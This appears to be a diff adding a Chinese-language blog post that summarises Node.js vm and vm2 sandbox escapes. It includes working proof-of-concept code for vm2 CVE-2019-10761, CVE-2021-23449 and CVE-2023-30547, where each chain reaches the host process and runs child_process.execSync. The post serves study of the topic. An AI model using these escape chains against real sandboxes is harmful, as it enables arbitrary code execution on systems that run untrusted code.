+<p>在 JavaScript 中，Object.create(null) 会创建一个纯净的对象，它没有继承自 Object.prototype 或任何其他原型对象，因此不会拥有默认的原型方法和属性。这样的对象通常被称为“空对象”或“纯净对象”。</p>
+<p>在这个纯净对象 sandbox 上下文中，由于没有原型链，它的 this 值将为 null。</p>
+<p>这时，上面使用this和引用类型的来访问外部模块的方法就没有办法生效了，那么我们就可以通过callee和caller来进行实现</p>
+<p>我们先介绍一下callee和caller这两个属性：</p>
+<blockquote>
+<p> callee 和 caller  都是已经被废弃的属性</p>
+<p> callee，会指向调用函数本身</p>
+<p> caller，会指向谁调用你的函数</p>
+<p>arguments.callee.caller，是一个函数中的内置对象的属性，它可以返回函数的调用者。</p>
+</blockquote>
+<p>沙箱逃逸其实就是找到一个沙箱外的对象，并调用其中的方法。</p>
+<p>这种情况下也是一样的，我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，这时我们定义的函数的arguments.callee.caller就会指向外部（指向沙箱外的调用者），然后我们在沙箱内就可以进行逃逸了。</p>
+<p>具体实现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">vm</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">script</span> = <br>`<br>(()=&gt; &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">a</span>= &#123;&#125;<br>    a.toString = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">cc</span>= arguments.callee.caller<br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">p</span> =(cc.<span class="hljs-title function_ invoke__">constructor</span>(<span class="hljs-string">&#x27;return process&#x27;</span>))()<br>        <span class="hljs-keyword">return</span> p.mainModule.<span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_ invoke__">execSync</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-title function_ invoke__">toString</span>()<br>    &#125;<br>    <span class="hljs-keyword">return</span> a<br>&#125;)()<br>`;<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">sandbox</span> = Object.<span class="hljs-title function_ invoke__">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">context</span> = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_ invoke__">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">res</span> = vm.<span class="hljs-title function_ invoke__">runInContext</span>(script, context);<br>console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&#x27;hello&#x27;</span> + res); <span class="hljs-comment">//js中某一个东西和字符串拼接，最终的结果是一个字符串</span><br><br></code></pre></td></tr></table></figure>
+
+<p>分析一下上面代码，我们在沙箱内先创建了一个对象，并且将这个对象的toString方法进行了重写，</p>
+<p>注意沙箱外在console.log中将字符串与运行结果进行了拼接，这样沙箱中代码的最终结果会转换成字符串，沙箱内的a.toString 方法就被外部的toString方法调用</p>
+<p>然后通过<code>arguments.callee.caller</code>获得到沙箱外的toString方法，利用toString方法的构造函数返回了process（这里就和第一种方法原理一致了），再调用process进行rce。</p>
+<p>简单地说，沙箱外在console.log中通过字符串拼接的方式触发了这个重写后的toString函数，而重写的函数里又通过指向其触发者，拿到沙箱外的对象，进一步实现命令执行。</p>
+<p><strong>方法3：利用ES6的 proxy 模式来劫持外部get操作</strong></p>
+<p>上面方法2的前提是打印时，需要与一个字符串拼接的行为，如果沙箱外没有执行字符串的相关操作来触发这个toString，并且也没有可以用来进行恶意重写的函数，怎么逃逸呢</p>
+<p>那么我们可以用<code>Proxy</code>来劫持属性</p>
+<p><strong>Proxy</strong>可理解为：在目标对象前架设一层“拦截”，外界对该对象的访问，都必须先通过这层拦截，相当于对外界的访问进行过滤和改写。</p>
+<p>详见：<a target="_blank" rel="noopener" href="https://juejin.cn/post/6844904090116292616">Proxy 和 Reflect一个 Proxy 对象包装另一个对象并拦截诸如读取&#x2F;写入属性和其他操作，可以选择自行处理它 - 掘金</a></p>
+<p>例如，拦截读取属性行为：</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> proxy = <span class="hljs-keyword">new</span> Proxy(&#123;&#125;, &#123;<br>    <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">target, propKey</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">35</span>;<br>    &#125;<br>&#125;);<br><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(proxy.<span class="hljs-built_in">time</span>);   <span class="hljs-comment">// 35</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(proxy.name);   <span class="hljs-comment">// 35</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(proxy.title);  <span class="hljs-comment">// 35</span><br></code></pre></td></tr></table></figure>
+
+<p>逃逸方式</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> script = <br>`<br>(() =&gt; &#123;<br>    <span class="hljs-keyword">const</span> a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Proxy</span>(&#123;&#125;,&#123;<br>        get:<span class="hljs-keyword">function</span>()&#123;<br>        <span class="hljs-keyword">const</span> cc = arguments.callee.caller;<br>        <span class="hljs-keyword">const</span> p = (cc.constructor.constructor(<span class="hljs-string">&#x27;return process&#x27;</span>))();<br>        <span class="hljs-keyword">return</span> p.mainModule.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;whoami&#x27;</span>).toString()<br>        &#125;<br>     &#125;)<br><span class="hljs-keyword">return</span> a &#125;)()<br>`;<br><span class="hljs-regexp">// //</span> 定义代理模式，将代理模式定义为空对象，这个空对象有get方法<br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-built_in">Object</span>.create(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.createContext(sandbox);<br><span class="hljs-keyword">const</span> res = vm.runInContext(script, context);<br>console.log(res.xxx);<br></code></pre></td></tr></table></figure>
+
+<p>触发利用链的逻辑就是我们在<code>get:</code>这个钩子里写了一个恶意函数，当我们在沙箱外访问proxy对象的任意属性（不论是否存在）这个钩子就会自动运行，实现了rce。</p>
+<p>如果沙箱的返回值返回的是我们无法利用的对象或者没有返回值应该怎么进行逃逸呢？</p>
+<p>我们可以借助异常，把我们沙箱内的对象抛出去，如果外部有捕捉异常的（如日志）逻辑，则也可能触发漏洞：</p>
+<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">const vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br>const script = `<span class="language-javascript"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123; </span><br><span class="language-javascript">    <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; </span><br><span class="language-javascript">     <span class="hljs-keyword">const</span> cc = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>; </span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> p = (cc.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>))(); </span><br><span class="language-javascript">    <span class="hljs-keyword">return</span> p.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-title function_">toString</span>() </span><br><span class="language-javascript">    &#125;  </span><br><span class="language-javascript">    &#125;) </span>`;<br><span class="hljs-keyword">try</span> &#123; vm.runInContext(script, vm.createContext(<span class="hljs-built_in">Object</span>.create(<span class="hljs-literal">null</span>))); &#125;<br><span class="hljs-keyword">catch</span> (e) &#123; console.log(<span class="hljs-string">&#x27;error happend: &#x27;</span> + e); &#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里我们用catch捕获到了throw出的proxy对象，在console.log时由于将字符串与对象拼接，将报错信息和rce的回显一起带了出来。</p>
+<h2 id="vm2沙箱逃逸"><a href="#vm2沙箱逃逸" class="headerlink" title="vm2沙箱逃逸"></a>vm2沙箱逃逸</h2><h3 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h3><p>通过上面几个例子可以看出来vm沙箱隔离功能较弱，有很多逃逸的方法，所以第三方包vm2在vm的基础上做了一些优化</p>
+<p>我们这里可以安装vm2包</p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span> vm2<br></code></pre></td></tr></table></figure>
+
+<p>vm2出现过多次逃逸的问题，所以现有的代码被进行了大量修改，为了方便分析需要使用较老版本的vm2，但github上貌似将3.9以前的版本全都删除了，所以我这里也找不到对应的资源了，代码分析也比较麻烦，直接移步链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/207283#h2-1">vm2实现原理分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>
+<p>这里我们就不进行分析了，直接给出漏洞及利用方式</p>
+<h3 id="CVE-2019-10761"><a href="#CVE-2019-10761" class="headerlink" title="CVE-2019-10761"></a><strong>CVE-2019-10761</strong></h3><p>该漏洞要求vm2版本&lt;&#x3D;3.6.10</p>
+<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-string">&quot;use strict&quot;</span>;<br>const &#123;VM&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm2&#x27;</span>);<br>const untrusted = `<span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">const</span> f = <span class="hljs-title class_">Buffer</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">write</span>;</span><br><span class="language-javascript"><span class="hljs-keyword">const</span> ft = &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">length</span>: <span class="hljs-number">10</span>,</span><br><span class="language-javascript">        <span class="hljs-title function_">utf8Write</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">r</span>(<span class="hljs-params">i</span>)&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> x = <span class="hljs-number">0</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">try</span>&#123;</span><br><span class="language-javascript">        x = <span class="hljs-title function_">r</span>(i);</span><br><span class="language-javascript">    &#125;<span class="hljs-keyword">catch</span>(e)&#123;&#125;</span><br><span class="language-javascript">    <span class="hljs-keyword">if</span>(<span class="hljs-title function_">typeof</span>(x)!==<span class="hljs-string">&#x27;number&#x27;</span>)</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> x;</span><br><span class="language-javascript">    <span class="hljs-keyword">if</span>(x!==i)</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> x+<span class="hljs-number">1</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">try</span>&#123;</span><br><span class="language-javascript">        f.<span class="hljs-title function_">call</span>(ft);</span><br><span class="language-javascript">    &#125;<span class="hljs-keyword">catch</span>(e)&#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> e;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> i=<span class="hljs-number">1</span>;</span><br><span class="language-javascript"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">try</span>&#123;</span><br><span class="language-javascript">        i=<span class="hljs-title function_">r</span>(i).<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return process&quot;</span></span>)(<span class="hljs-params"></span>);</span><br><span class="language-javascript">        <span class="hljs-keyword">break</span>;</span><br><span class="language-javascript">    &#125;<span class="hljs-keyword">catch</span>(x)&#123;</span><br><span class="language-javascript">        i++;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">i.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;whoami&quot;</span>).<span class="hljs-title function_">toString</span>()</span><br><span class="language-javascript"></span>`;<br><span class="hljs-keyword">try</span>&#123;<br>    console.log(<span class="hljs-keyword">new</span> VM().run(untrusted));<br>&#125;<span class="hljs-keyword">catch</span>(x)&#123;<br>    console.log(x);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个链子在p牛的知识星球上有，很抽象，沙箱逃逸说到底就是要从沙箱外获取一个对象，然后获得这个对象的constructor属性。</p>
+<p>这条链子获取沙箱外对象的方法是 在沙箱内不断递归一个函数，当递归次数超过当前环境的最大值时，我们正好调用沙箱外的函数，就会导致沙箱外的调用栈被爆掉，我们在沙箱内catch这个异常对象，就拿到了一个沙箱外的对象。</p>
+<p>举个例子：</p>
+<p>假设当前环境下最大递归值为1000，我们通过程序控制递归999次（注意这里说的递归值不是一直调用同一个函数的最大值，而是单次程序内调用函数次数的最大值，也就是调用栈的最大值）：</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-attribute">r</span>(i);      <span class="hljs-comment">// 该函数递归999次</span><br>f<span class="hljs-selector-class">.call</span>(ft);    <span class="hljs-comment">// 递归到第1000次时调用f这个函数，f为Buffer.prototype.write，就是下面图片的这个函数</span><br>this<span class="hljs-selector-class">.utf8Write</span>()   <span class="hljs-comment">// 递归到1001次时为该函数，是一个外部函数，所以爆栈时捕捉的异常也是沙箱外，从而返回了一个沙箱外的异常对象</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132249391.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="CVE-2021-23449"><a href="#CVE-2021-23449" class="headerlink" title="CVE-2021-23449"></a><strong>CVE-2021-23449</strong></h3><p>这个漏洞在snyk解释是原型链污染导致的沙箱逃逸，但p牛在知识星球里发了其实是另外的原因</p>
+<p><a target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-JS-VM2-1585918">Sandbox Bypass in vm2 | CVE-2021-23449 | Snyk</a></p>
+<p>poc：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> res = <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./foo.js&#x27;</span>)<br>res.<span class="hljs-property">toString</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return this&quot;</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">process</span>.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;whoami&quot;</span>).<span class="hljs-title function_">toString</span>();<br></code></pre></td></tr></table></figure>
+
+<p>import()在JavaScript中是一个语法结构，不是函数，没法通过之前对require这种函数处理相同的方法来处理它，导致实际上我们调用import()的结果实际上是没有经过沙箱的，是一个外部变量。 我们再获取这个变量的属性即可绕过沙箱。 vm2对此的修复方法也很粗糙，正则匹配并替换了<code>\bimport\b</code>关键字，在编译失败的时候，报Dynamic Import not supported错误。</p>
+<h3 id="另外一个trick"><a href="#另外一个trick" class="headerlink" title="另外一个trick"></a><strong>另外一个trick</strong></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Symbol</span> = &#123;<br>  <span class="hljs-keyword">get</span> <span class="hljs-title function_">toStringTag</span>()&#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-function"><span class="hljs-params">f</span>=&gt;</span>f.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return process&quot;</span></span>)(<span class="hljs-params"></span>)<br>  &#125;<br>&#125;;<br><span class="hljs-keyword">try</span>&#123;<br>  <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>());<br>&#125;<span class="hljs-keyword">catch</span>(f)&#123;<br>  <span class="hljs-title class_">Symbol</span> = &#123;&#125;;<br>  <span class="hljs-title function_">f</span>(<span class="hljs-function">()=&gt;</span>&#123;&#125;).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;whoami&quot;</span>).<span class="hljs-title function_">toString</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在vm2的原理中提到vm2会为对象配置代理并初始化，如果对象是以下类型：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132249954.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>就会return <code>Decontextify.instance</code> 函数，这个函数中用到了Symbol全局对象，我们可以通过劫持Symbol对象的getter并抛出异常，再在沙箱内拿到这个异常对象就可以了</p>
+<h3 id="其他CVE"><a href="#其他CVE" class="headerlink" title="其他CVE"></a>其他CVE</h3><p>多名安全研究人员先后发现了VM2中的多个沙箱逃逸漏洞，分别是Seongil Wi发现的CVE-2023-29017漏洞和SeungHyun Lee发现的CVE-2023-29199、CVE-2023-30547漏洞。攻击者利用这些漏洞可以绕过沙箱环境的限制运行恶意代码。CVE-2023-29017漏洞影响vm2 3.9.14之前版本，VM2已在3.9.15版本中修复了该漏洞。</p>
+<p>这里提一下CVE-2023-30547</p>
+<p>CVE-2023-30547漏洞是由来自韩国科学技术院（KAIST）的SeungHyun Lee发现的，该漏洞属于异常处理漏洞，允许攻击者在handleException()内引发未处理的主机异常，CVSS评分9.8分。</p>
+<p>handleException()函数负责处理沙箱中的异常以预防主机信息泄露。但如果攻击者设置一个定制的getPrototypeOf()代理处理器来抛出未处理的主机异常，handleException()函数就无法处理该异常。那么攻击者就可以访问主机函数，即绕过沙箱的限制实现逃逸，并可以在主机环境内执行任意代码。</p>
+<p>vm2 在 3.9.16 版本及以下存在一个漏洞，攻击者可以在 <code>handleException()</code> 中触发未处理的宿主异常，从而逃逸沙盒并在宿主上下文中执行任意代码。</p>
+<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">const &#123;VM&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm2&quot;</span>);<br>const vm = <span class="hljs-keyword">new</span> VM();<br><br>const code = `<span class="language-javascript"></span><br><span class="language-javascript">err = &#123;&#125;;</span><br><span class="language-javascript"><span class="hljs-keyword">const</span> handler = &#123;</span><br><span class="language-javascript">    <span class="hljs-title function_">getPrototypeOf</span>(<span class="hljs-params">target</span>) &#123;</span><br><span class="language-javascript">        (<span class="hljs-keyword">function</span> <span class="hljs-title function_">stack</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>().<span class="hljs-property">stack</span>;</span><br><span class="language-javascript">            <span class="hljs-title function_">stack</span>();</span><br><span class="language-javascript">        &#125;)();</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">&#125;;</span><br><span class="language-javascript">  </span><br><span class="language-javascript"><span class="hljs-keyword">const</span> proxiedErr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(err, handler);</span><br><span class="language-javascript"><span class="hljs-keyword">try</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">throw</span> proxiedErr;</span><br><span class="language-javascript">&#125; <span class="hljs-keyword">catch</span> (&#123;<span class="hljs-attr">constructor</span>: c&#125;) &#123;</span><br><span class="language-javascript">    c.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;touch pwned&#x27;</span>);</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span>`<br><br>console.log(vm.run(code));<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73512445/article/details/133970916">NodeJS VM沙箱逃逸_let sandbox &#x3D; object.create(null); let context &#x3D; v-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_68163788/article/details/134320028">Nodejs沙箱绕过_nodesandbox-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11305">NodeJS VM和VM2沙箱逃逸-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/16899212.html">nodejs vm&#x2F;vm2沙箱逃逸分析 - zpchcbd - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.4hou.com/posts/m0wp">vm2再爆沙箱逃逸漏洞 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com</a></p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">Sandbox Escape in vm2@3.9.16 · GitHub --- Sandbox Escape in vm2@3.9.16 · GitHub</a></p>
 
                 
               </div>
@@ -457,7 +632,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Flask安全问题</div>
+      <div>node vm沙箱逃逸学习总结</div>
       <div>http://example.com/2025/test31/</div>
     </div>
     <div class="license-meta">
@@ -502,9 +677,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/test32/" title="vm沙箱逃逸学习总结">
+                      <a href="/2025/test32/" title="node.js原型链污染学习总结">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">vm沙箱逃逸学习总结</span>
+                        <span class="hidden-mobile">node.js原型链污染学习总结</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -512,8 +687,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/test30/" title="python反序列化学习总结">
-                        <span class="hidden-mobile">python反序列化学习总结</span>
+                      <a href="/2025/test30/" title="Flask安全问题">
+                        <span class="hidden-mobile">Flask安全问题</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
